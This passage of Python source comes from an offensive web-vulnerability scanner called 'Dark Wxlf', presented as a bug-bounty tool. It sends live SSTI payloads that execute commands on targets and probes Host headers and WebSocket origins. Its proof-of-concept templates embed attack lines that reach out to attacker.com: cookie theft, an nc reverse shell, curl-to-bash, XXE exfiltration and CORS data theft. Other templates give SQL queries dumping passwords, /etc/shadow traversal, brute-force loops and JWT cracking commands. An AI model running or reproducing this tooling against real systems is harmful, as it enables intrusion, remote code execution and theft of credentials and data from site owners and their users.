                        'cvss': '9.8 CRITICAL'
                    }
                    found.append(vuln)
                    self.log(f"SSTI ({detected_engine}): {base}", "success")
                    
                    # now try RCE payloads specific to engine
                    rce_attempted = False
                    
                    if detected_engine == 'jinja2':
                        # try jinja2 RCE
                        rce_payload = "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
                        try:
                            test_url = f"{base}?{param}={rce_payload}"
                            r2 = requests.get(test_url, timeout=3, verify=False)
                            
                            if 'uid=' in r2.text or 'gid=' in r2.text:
                                vuln2 = {
                                    'type': 'SSTI (Jinja2 RCE)',
                                    'severity': 'CRITICAL',
                                    'url': test_url,
                                    'param': param,
                                    'payload': rce_payload,
                                    'evidence': 'RCE confirmed - executed id command',
                                    'impact': 'Complete server takeover',
                                    'fix': 'Disable template rendering of user input',
                                    'poc': self.ssti_poc(test_url, param, rce_payload),
                                    'cvss': '10.0 CRITICAL'
                                }
                                found.append(vuln2)
                                self.log(f"SSTI RCE confirmed: {base}", "success")
                                rce_attempted = True
                        except:
                            pass
                    
                    elif detected_engine == 'freemarker':
                        # try freemarker RCE
                        rce_payload = '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }'
                        try:
                            test_url = f"{base}?{param}={rce_payload}"
                            r2 = requests.get(test_url, timeout=3, verify=False)
                            
                            if 'uid=' in r2.text:
                                vuln2 = {
                                    'type': 'SSTI (Freemarker RCE)',
                                    'severity': 'CRITICAL',
                                    'url': test_url,
                                    'param': param,
                                    'payload': rce_payload,
                                    'evidence': 'Executed system command successfully',
                                    'impact': 'Full system access',
                                    'fix': 'Sanitize all template input',
                                    'poc': self.ssti_poc(test_url, param, rce_payload),
                                    'cvss': '10.0 CRITICAL'
                                }
                                found.append(vuln2)
                                self.log(f"SSTI RCE (freemarker): {base}", "success")
                                rce_attempted = True
                        except:
                            pass
                    
                    break  # found ssti on this param, move to next
        
        self.log(f"SSTI tests done: {len(found)} findings", "success")
        return found
    
    def test_host_header(self):
        self.log("Testing for Host header injection...", "info")
        
        found = []
        
        for app in self.data.get('web_apps', [])[:15]:
            url = app['url']
            
            try:
                # test with evil host header
                r = requests.get(
                    url,
                    headers={'Host': 'evil.com'},
                    timeout=3,
                    verify=False,
                    allow_redirects=False
                )
                
                # check if our host is reflected
                if 'evil.com' in r.text or 'evil.com' in str(r.headers):
                    vuln = {
                        'type': 'Host Header Injection',
                        'severity': 'MEDIUM',
                        'url': url,
                        'param': 'Host header',
                        'payload': 'Host: evil.com',
                        'evidence': 'Malicious host header reflected',
                        'impact': 'Password reset poisoning, cache poisoning, SSRF',
                        'fix': 'Validate Host header, use absolute URLs',
                        'poc': self.host_header_poc(url),
                        'cvss': '6.5 MEDIUM'
                    }
                    found.append(vuln)
                    self.log(f"Host header injection: {url}", "success")
            except:
                pass
        
        self.log(f"Host header tests done: {len(found)} findings", "success")
        return found
    
    def test_websocket(self):
        self.log("Testing WebSocket security...", "info")
        
        found = []
        ws_paths = ['/ws', '/websocket', '/socket', '/chat']
        
        for app in self.data.get('web_apps', [])[:10]:
            url = app['url']
            
            for path in ws_paths:
                try:
                    # check if websocket endpoint exists
                    ws_url = url.replace('https://', 'wss://').replace('http://', 'ws://') + path
                    
                    # try to connect with evil origin
                    headers = {'Origin': 'https://evil.com'}
                    
                    # note: actual WS testing would need websocket library
                    # this is a simplified check
                    r = requests.get(
                        url + path,
                        headers=headers,
                        timeout=3,
                        verify=False
                    )
                    
                    # check if endpoint responds
                    if r.status_code in [101, 200, 426]:
                        vuln = {
                            'type': 'WebSocket Security Issue',
                            'severity': 'MEDIUM',
                            'url': ws_url,
                            'param': 'WebSocket connection',
                            'payload': 'Origin: https://evil.com',
                            'evidence': 'WebSocket endpoint doesn\'t validate origin',
                            'impact': 'Cross-site WebSocket hijacking',
                            'fix': 'Validate Origin header, use tokens',
                            'poc': self.websocket_poc(ws_url),
                            'cvss': '6.5 MEDIUM'
                        }
                        found.append(vuln)
                        self.log(f"WebSocket issue: {ws_url}", "success")
                except:
                    pass
        
        self.log(f"WebSocket tests done: {len(found)} findings", "success")
        return found
    
    # PoC generators for original vulns
    def xss_poc(self, url, param, payload):
        return f"""
XSS Proof of Concept
====================
URL: {url}
Param: {param}
Payload: {payload}

Steps:
1. Go to: {url.split('?')[0]}
2. Set '{param}' to: {payload}
3. Check browser console for alert()

Exploitation:
{url.split('?')[0]}?{param}=<script>fetch('https://attacker.com?c='+document.cookie)</script>

Fix:
- HTML encode output
- Use CSP headers
- HTTPOnly cookies
"""
    
    def sqli_poc(self, url, param, payload):
        return f"""
SQL Injection PoC
=================
URL: {url}
Param: {param}
Payload: {payload}

Steps:
1. Access: {url}
2. Check for SQL errors
3. Run: sqlmap -u "{url.split('?')[0]}?{param}=1" -p {param} --dbs

Advanced:
' UNION SELECT schema_name FROM information_schema.schemata--
' UNION SELECT username,password FROM users--

Fix:
- Use prepared statements
- Never concat user input into SQL
"""
    
    def idor_poc(self, url, param):
        return f"""
IDOR Proof of Concept
=====================
URL: {url}
Param: {param}

Steps:
1. Login as User A
2. Access: {url}
3. Note {param} value (e.g., {param}=123)
4. Change to {param}=124
5. Access User B's data (unauthorized)

Fix:
- Check user owns resource
- Use indirect reference maps
"""
    
    def ssrf_poc(self, url, param, payload):
        return f"""
SSRF Proof of Concept
=====================
URL: {url}
Param: {param}
Payload: {payload}

Steps:
1. Set {param} to: {payload}
2. Server makes internal request
3. Try AWS metadata: http://169.254.169.254/latest/meta-data/

Fix:
- Whitelist domains
- Block private IPs
"""
    
    def redir_poc(self, url, param):
        return f"""
Open Redirect PoC
=================
URL: {url}
Param: {param}

Phishing:
{url.split('?')[0]}?{param}=https://fake-{self.target}.com/login

Fix:
- Whitelist destinations
- Validate URLs
"""
    
    # NEW PoC GENERATORS
    
    def xxe_poc(self, url):
        return f"""
XXE Proof of Concept
====================
URL: {url}

Payload:
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>

Steps:
1. Send POST to {url}
2. Content-Type: application/xml
3. Include XXE payload in body
4. Server reads /etc/passwd

Advanced:
- Read source code: file:///var/www/html/config.php
- SSRF: http://internal-server/admin
- Out-of-band: <!ENTITY xxe SYSTEM "http://attacker.com/collect?data=...">

Fix:
- Disable external entities
- Use less complex data formats (JSON)
"""
    
    def cmd_injection_poc(self, url, param, payload):
        return f"""
Command Injection PoC
=====================
URL: {url}
Param: {param}
Payload: {payload}

Steps:
1. Inject: {url.split('?')[0]}?{param}={payload}
2. Server executes system command
3. Output may be visible in response

Exploitation:
{url.split('?')[0]}?{param}=; nc attacker.com 4444 -e /bin/sh
{url.split('?')[0]}?{param}=`curl http://attacker.com/shell.sh | bash`

Fix:
- Never pass user input to shell
- Use safe APIs instead of system()
- Input validation with whitelist
"""
    
    def path_traversal_poc(self, url, param, payload):
        return f"""
Path Traversal PoC
==================
URL: {url}
Param: {param}
Payload: {payload}

Steps:
1. Access: {url}
2. File contents are disclosed
3. Try other files: ../../../etc/shadow

Targets:
- /etc/passwd (Linux users)
- /etc/shadow (password hashes)
- /var/www/html/config.php (app configs)
- C:\\windows\\win.ini (Windows)

Fix:
- Whitelist allowed files
- Use file IDs instead of paths
- chroot jail the application
"""
    
    def sensitive_file_poc(self, url, file):
        return f"""
Sensitive File Exposure
=======================
URL: {url}
File: {file}

Steps:
1. Access: {url}
2. File is publicly accessible
3. Review contents for secrets

Impact:
- Credentials in .env files
- Source code disclosure
- Database dumps
- Private keys

Fix:
- Remove sensitive files from web root
- Configure web server to block dotfiles
- Use .gitignore properly
"""
    
    def cors_poc(self, url):
        return f"""
CORS Misconfiguration PoC
=========================
URL: {url}

HTML Exploit:
<script>
fetch('{url}', {{
  credentials: 'include'
}})
.then(r => r.text())
.then(data => {{
  fetch('https://attacker.com/steal?data=' + btoa(data));
}});
</script>

Steps:
1. Victim visits attacker site
2. JavaScript makes authenticated request
3. Response is stolen

Fix:
- Whitelist specific origins
- Don't reflect arbitrary origins
- Remove Access-Control-Allow-Credentials if not needed
"""
    
    def sec_headers_poc(self, url, missing):
        return f"""
Missing Security Headers
========================
URL: {url}
Missing: {', '.join(missing)}

Impact:
- No X-Frame-Options = Clickjacking
- No CSP = XSS attacks easier
- No HSTS = MITM attacks
- No X-Content-Type-Options = MIME confusion

Fix in Nginx:
add_header X-Frame-Options "SAMEORIGIN";
add_header Content-Security-Policy "default-src 'self'";
add_header Strict-Transport-Security "max-age=31536000";
add_header X-Content-Type-Options "nosniff";

Fix in Apache:
Header always set X-Frame-Options "SAMEORIGIN"
Header always set Content-Security-Policy "default-src 'self'"
"""
    
    def rate_limit_poc(self, url):
        return f"""
Rate Limiting Bypass
====================
URL: {url}

Attack:
for i in {{1..1000}}; do
  curl -X POST {url} -d "user=admin&pass=$i" &
done

Impact:
- Brute force passwords
- Credential stuffing
- Account enumeration
- DoS

Fix:
- Limit requests per IP: 5 per minute
- Implement account lockout
- Use CAPTCHA after failures
- Monitor for suspicious patterns
"""
    
    def crlf_poc(self, url, param, payload):
        return f"""
CRLF Injection PoC
==================
URL: {url}
Param: {param}
Payload: {payload}

Exploitation:
{url.split('?')[0]}?{param}=%0d%0aSet-Cookie:session=hacked

Impact:
- HTTP Response Splitting
- Session fixation
- XSS via injected headers
- Cache poisoning

Fix:
- Strip \\r and \\n from input
- Use URL encoding properly
- Don't reflect user input in headers
"""
    
    def graphql_poc(self, url):
        return f"""
GraphQL Introspection PoC
=========================
URL: {url}

Query to dump schema:
{{
  __schema {{
    types {{
      name
      fields {{
        name
        type {{
          name
        }}
      }}
    }}
  }}
}}

Steps:
1. POST to {url}
2. Include introspection query
3. Enumerate all types and fields
4. Find hidden/admin queries

Fix:
- Disable introspection in production
- Use query depth limiting
- Implement authentication
"""
    
    def jwt_poc(self, url, token):
        return f"""
JWT Vulnerability PoC
=====================
URL: {url}
Token: {token[:50]}...

Attack - None Algorithm:
1. Decode JWT header
2. Change "alg" to "none"
3. Remove signature
4. Use modified token

Attack - Weak Secret:
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

Fix:
- Reject "none" algorithm
- Use strong secrets (32+ chars)
- Consider RS256 instead of HS256
- Validate signature properly
"""
    
    def subdomain_takeover_poc(self, subdomain, service):
        return f"""
Subdomain Takeover PoC
======================
Subdomain: {subdomain}
Service: {service}

Steps:
1. DNS points to {service}
2. Service account is unclaimed
3. Register account on {service}
4. Point to your content
5. Subdomain now under attacker control

Impact:
- Phishing campaigns
- Malware distribution
- Cookie theft (same parent domain)
- SEO poisoning

Fix:
- Remove DNS record immediately
- Monitor for dangling records
- Reclaim service if possible
"""
    
    def ssti_poc(self, url, param, payload):
        return f"""
SSTI Proof of Concept
=====================
URL: {url}
Param: {param}
Payload: {payload}

Exploitation (Jinja2):
{{{{ config.items() }}}}
{{{{ ''.__class__.__mro__[1].__subclasses__() }}}}
{{{{ ''.__class__.__mro__[1].__subclasses__()[401]('whoami',shell=True,stdout=-1).communicate()[0].strip() }}}}

Steps:
1. Inject template expression
2. Server evaluates it
3. Achieve RCE

Fix:
- Never pass user input to template engine
- Use sandboxed environments
- Escape template syntax
"""
    
    def host_header_poc(self, url):
        return f"""
Host Header Injection PoC
=========================
URL: {url}

Attack:
POST /reset-password
Host: evil.com
...

email=victim@example.com

Impact:
- Password reset emails go to evil.com
- Cache poisoning
- SSRF
- Virtual host confusion

Fix:
- Validate Host header against whitelist
- Use absolute URLs in emails
- Don't trust Host header for routing
"""
    
    def websocket_poc(self, url):
        return f"""
WebSocket Security Issue
========================
URL: {url}

Attack:
<script>
var ws = new WebSocket('{url}');
ws.onopen = function() {{
  ws.send(JSON.stringify({{
    action: 'adminCommand',
    data: 'malicious'
  }}));
}};
</script>

Impact:
- Cross-site WebSocket hijacking
- Unauthorized actions
- Real-time data theft

Fix:
- Validate Origin header
- Use authentication tokens
- Implement CSRF tokens
"""
    
    def nuclei_poc(self, data):
        """Generate PoC from nuclei finding"""
        template_id = data.get('template-id', 'unknown')
        matched = data.get('matched-at', '')
        
        return f"""
Nuclei Detection
================
Template: {template_id}
Matched At: {matched}

Description:
{data.get('info', {}).get('description', 'No description')}

Severity: {data.get('info', {}).get('severity', 'unknown').upper()}

Reference:
{data.get('info', {}).get('reference', 'See Nuclei documentation')}

Remediation:
{data.get('info', {}).get('remediation', 'Check vendor security advisories')}

More Info:
https://github.com/projectdiscovery/nuclei-templates
"""
    
    def make_report(self, findings):
        self.log("\nGenerating reports...", "info")
        
        if not findings:
            self.log("No findings to report", "warning")
            return
        
        # sort by severity
        sev_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3, 'UNKNOWN': 4}
        findings.sort(key=lambda x: sev_order.get(x['severity'], 99))
        
        # count by severity
        crit = len([f for f in findings if f['severity'] == 'CRITICAL'])
        high = len([f for f in findings if f['severity'] == 'HIGH'])
        med = len([f for f in findings if f['severity'] == 'MEDIUM'])
        low = len([f for f in findings if f['severity'] == 'LOW'])
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # Generate each requested format
        generated_files = []
        
        if 'txt' in self.output_formats:
            txt_file = self.generate_txt_report(findings, crit, high, med, low, timestamp)
            if txt_file:
                generated_files.append(txt_file)
        
        if 'json' in self.output_formats:
            json_file = self.generate_json_report(findings, crit, high, med, low, timestamp)
            if json_file:
                generated_files.append(json_file)
        
        if 'html' in self.output_formats:
            html_file = self.generate_html_report(findings, crit, high, med, low, timestamp)
            if html_file:
                generated_files.append(html_file)
        
        # Print summary
        print(colored("\n╔═══════════════════════════════════════════════════════════════╗", 'red'))
        print(colored("║                     RESULTS SUMMARY                            ║", 'red', attrs=['bold']))
        print(colored("╚═══════════════════════════════════════════════════════════════╝\n", 'red'))
        
        print(colored(f"Total Findings: {len(findings)}", 'yellow', attrs=['bold']))
        print(colored(f"Critical: {crit} | High: {high} | Medium: {med} | Low: {low}", 'yellow'))
        print()
        print(colored("Generated Reports:", 'green', attrs=['bold']))
        for f in generated_files:
            print(colored(f"  ✓ {f}", 'green'))
    
    def generate_txt_report(self, findings, crit, high, med, low, timestamp):
        """Generate text report"""
        lines = []
        lines.append("=" * 80)
        lines.append("DARK WXLF - COMPREHENSIVE BUG BOUNTY REPORT")
        lines.append(f"By: GhxstSh3ll")
        lines.append(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        lines.append(f"Target: {self.target}")
        if self.waf_detected:
            lines.append(f"WAF Detected: {', '.join(self.waf_detected)}")
        lines.append("=" * 80)
        lines.append("")
        
        lines.append("EXECUTIVE SUMMARY")
        lines.append("-" * 80)
        lines.append(f"Total Vulnerabilities Found: {len(findings)}")
        lines.append(f"Critical: {crit}")
        lines.append(f"High: {high}")
        lines.append(f"Medium: {med}")
        lines.append(f"Low: {low}")
        lines.append("")
        
        for i, f in enumerate(findings, 1):
            lines.append("=" * 80)
            lines.append(f"FINDING #{i}: {f['type']}")
            lines.append("=" * 80)
            lines.append(f"Severity: {f['severity']} | CVSS: {f.get('cvss', 'N/A')}")
            lines.append(f"URL: {f['url']}")
            lines.append(f"Parameter: {f['param']}")
            lines.append(f"Payload: {f['payload']}")
            lines.append("")
            lines.append(f"Evidence: {f['evidence']}")
            lines.append(f"Impact: {f['impact']}")
            lines.append(f"Remediation: {f['fix']}")
            lines.append("")
            lines.append("Proof of Concept:")
            lines.append(f['poc'])
            lines.append("")
        
        fname = f"bug_bounty_report_{self.target}_{timestamp}.txt"
        with open(fname, 'w') as file:
            file.write('\n'.join(lines))
        
        self.log(f"TXT report saved: {fname}", "success")
        return fname
    
    def generate_json_report(self, findings, crit, high, med, low, timestamp):
        """Generate JSON report for tool integration"""
        report = {
            'scan_info': {
                'tool': 'Dark Wxlf',
                'author': 'GhxstSh3ll',
                'target': self.target,
                'timestamp': datetime.now().isoformat(),
                'waf_detected': self.waf_detected
            },
            'summary': {
                'total': len(findings),
                'critical': crit,
                'high': high,
                'medium': med,
                'low': low
            },
            'findings': []
        }
        
        for i, f in enumerate(findings, 1):
            finding = {
                'id': i,
                'type': f['type'],
                'severity': f['severity'],
                'cvss': f.get('cvss', 'N/A'),
                'url': f['url'],
                'parameter': f['param'],
                'payload': f['payload'],
                'evidence': f['evidence'],
                'impact': f['impact'],
                'remediation': f['fix'],
                'poc': f['poc']
            }
            report['findings'].append(finding)
        
        fname = f"bug_bounty_report_{self.target}_{timestamp}.json"
        with open(fname, 'w') as file:
            json.dump(report, file, indent=2)
        
        self.log(f"JSON report saved: {fname}", "success")
        return fname
    
    def generate_html_report(self, findings, crit, high, med, low, timestamp):
        """Generate HTML report with styling"""
        
        # severity colors
        sev_colors = {
            'CRITICAL': '#dc3545',
            'HIGH': '#fd7e14',
            'MEDIUM': '#ffc107',
            'LOW': '#17a2b8',
            'UNKNOWN': '#6c757d'
        }
        
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Dark Wxlf Report - {self.target}</title>
    <meta charset="utf-8">
    <style>
        body {{
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #1a1a1a;
            color: #e0e0e0;
            margin: 0;
            padding: 20px;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            background: #2d2d2d;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
        }}
        h1 {{
            color: #ff4444;
            border-bottom: 3px solid #ff4444;
            padding-bottom: 10px;
        }}
        .header {{
            margin-bottom: 30px;
        }}
        .summary {{
            background: #1a1a1a;
            padding: 20px;
            border-radius: 5px;
            margin: 20px 0;
        }}
        .stat {{
            display: inline-block;
            margin: 10px 20px 10px 0;
            padding: 10px 20px;
            border-radius: 5px;
            font-weight: bold;
        }}
        .critical {{ background: #dc3545; }}
        .high {{ background: #fd7e14; }}
        .medium {{ background: #ffc107; color: #000; }}
        .low {{ background: #17a2b8; }}
        .finding {{
            background: #1a1a1a;
            margin: 20px 0;
            padding: 20px;
            border-left: 5px solid;
            border-radius: 5px;
        }}
        .finding-header {{
            font-size: 1.3em;
            margin-bottom: 15px;
            font-weight: bold;
        }}
        .detail {{
            margin: 10px 0;
        }}
        .label {{
            color: #888;
            font-weight: bold;
        }}
        .poc {{
            background: #0d0d0d;
            padding: 15px;
            border-radius: 5px;
            font-family: monospace;
            white-space: pre-wrap;
            margin-top: 10px;
        }}
        .waf-warning {{
            background: #856404;
            color: #ffc107;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
            font-weight: bold;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🐺 DARK WXLF - BUG BOUNTY REPORT</h1>
            <p><strong>Target:</strong> {self.target}</p>
            <p><strong>Date:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p><strong>By:</strong> GhxstSh3ll</p>
"""
        
        if self.waf_detected:
            html += f"""
            <div class="waf-warning">
                ⚠️ WAF Detected: {', '.join(self.waf_detected)}
            </div>
"""
        
        html += f"""
        </div>
        
        <div class="summary">
            <h2>Executive Summary</h2>
            <div>
                <span class="stat critical">CRITICAL: {crit}</span>
                <span class="stat high">HIGH: {high}</span>
                <span class="stat medium">MEDIUM: {med}</span>
                <span class="stat low">LOW: {low}</span>
            </div>
            <p style="margin-top: 20px;"><strong>Total Findings:</strong> {len(findings)}</p>
        </div>
"""
        
        for i, f in enumerate(findings, 1):
            severity = f['severity']
            color = sev_colors.get(severity, '#6c757d')
            
            html += f"""
        <div class="finding" style="border-left-color: {color};">
            <div class="finding-header" style="color: {color};">
                Finding #{i}: {f['type']}
            </div>
            <div class="detail">
                <span class="label">Severity:</span> <span style="color: {color};">{severity}</span> | 
                <span class="label">CVSS:</span> {f.get('cvss', 'N/A')}
            </div>
            <div class="detail">
                <span class="label">URL:</span> {f['url']}
            </div>
            <div class="detail">
                <span class="label">Parameter:</span> {f['param']}
            </div>
            <div class="detail">
                <span class="label">Payload:</span> <code>{f['payload']}</code>
            </div>
            <div class="detail">
                <span class="label">Evidence:</span> {f['evidence']}
            </div>
            <div class="detail">
                <span class="label">Impact:</span> {f['impact']}
            </div>
            <div class="detail">
                <span class="label">Remediation:</span> {f['fix']}
            </div>
            <div class="poc">
{f['poc']}
            </div>
        </div>
"""
        
        html += """
    </div>
</body>
</html>
"""
        
        fname = f"bug_bounty_report_{self.target}_{timestamp}.html"
        with open(fname, 'w') as file:
            file.write(html)
        
        self.log(f"HTML report saved: {fname}", "success")
        return fname
    
    def start(self):
        self.show_banner()
        
        print(colored("╔═══════════════════════════════════════════════════════════════╗", 'red'))
        print(colored("║                   TARGET SELECTION                             ║", 'red', attrs=['bold']))
        print(colored("╚═══════════════════════════════════════════════════════════════╝\n", 'red'))
        
        safe_mode = input(colored("[?] Enable Bug Bounty Safe Mode? (y/n): ", 'yellow')).lower()
        if safe_mode == 'y':
            print()
            rate_input = input(colored("[?] Max requests per second (10-50, default 10): ", 'cyan'))
            if rate_input.isdigit():
                rate = max(10, min(int(rate_input), 50))
                self.max_requests_per_second = rate
                self.request_delay = 1.0 / rate
            
            print()
            print(colored("[*] Configure scope (one domain per line, empty to finish)", 'cyan'))
            print(colored("    Example: *.example.com or api.example.com", 'white'))
            print()
            
            while True:
                scope_input = input(colored("    In-scope domain: ", 'green')).strip()
                if not scope_input:
                    break
                self.in_scope.append(scope_input)
                print(colored(f"    Added: {scope_input}", 'green'))
            
            if self.in_scope:
                print()
                print(colored("[*] Out-of-scope domains (optional)", 'cyan'))
                while True:
                    out_input = input(colored("    Out-of-scope domain: ", 'red')).strip()
                    if not out_input:
                        break
                    self.out_of_scope.append(out_input)
                    print(colored(f"    Excluded: {out_input}", 'red'))
            
            self.enable_bug_bounty_mode()
            print()
        
        tgt = input(colored("[?] Enter target domain (e.g., example.com): ", 'yellow'))
        
        if not tgt:
            self.log("No target provided", "error")
            return
        
        print()
        
        try:
            self.passive_recon(tgt)
        except KeyboardInterrupt:
            self.log("\nStopped by user", "warning")
            return
        except Exception as e:
            self.log(f"Error: {str(e)}", "error")
            return
        
        try:
            self.active_recon()
        except KeyboardInterrupt:
            self.log("\nStopped by user", "warning")
            return
        
        self.analyze()
        
        # NEW: Advanced recon options
        try:
            self.advanced_recon_menu()
        except KeyboardInterrupt:
            self.log("\nStopped by user", "warning")
        
        # NEW: Output format selection
        self.output_format_menu()
        
        self.test_vulns()
        
        self.log(f"\nAll data saved to: {self.output}", "success")
        
        if self.bug_bounty_mode:
            print(colored(f"\n[*] Total requests sent: {self.total_requests}", 'yellow'))
        
        print(colored("\n╔═══════════════════════════════════════════════════════════════╗", 'red'))
        print(colored("║                      SCAN COMPLETE                             ║", 'red', attrs=['bold']))
        print(colored("╚═══════════════════════════════════════════════════════════════╝\n", 'red'))

def main():
    try:
        tool = DarkWxlf()
        tool.start()
    except KeyboardInterrupt:
        print(colored("\n\n[!] Terminated by user", 'red'))
        sys.exit(0)
    except Exception as e:
        print(colored(f"\n[!] Error: {str(e)}", 'red'))
        sys.exit(1)

if __name__ == "__main__":
    main()
